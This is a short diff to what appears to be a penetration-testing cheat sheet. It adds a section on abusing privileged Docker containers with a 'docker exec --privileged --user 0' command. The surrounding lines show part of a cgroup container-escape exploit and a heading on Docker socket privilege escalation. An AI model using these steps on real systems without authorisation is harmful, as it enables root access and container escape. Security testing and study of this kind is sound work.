@@ -311,6 +311,14 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
 ```
 
+#### Privileged Docker Container Abuse
+
+##### Enter privileged Container as root
+
+```console
+$ sudo docker exec -it --privileged --user 0 <CONTAINER> /bin/bash
+```
+
 #### Docker Socket Privilege Escalation
 
 ##### Checking for Docker Socket
